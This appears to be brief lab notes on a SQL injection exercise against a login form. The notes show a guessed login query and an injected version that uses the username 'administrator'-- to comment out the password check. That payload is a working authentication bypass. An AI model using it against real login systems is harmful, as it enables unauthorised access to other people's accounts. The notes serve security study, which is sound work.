SQLi injection - Login functionality

End Goal: perform SQLi attack and log in as the *administrator* user.

Analysis
---

Possible query to login

```sql
SELECT firstname FROM users WHERE username='admin' AND password='admin'
```

```sql
SELECT firstname FROM users WHERE username='administrator'--' AND password='admin'
```
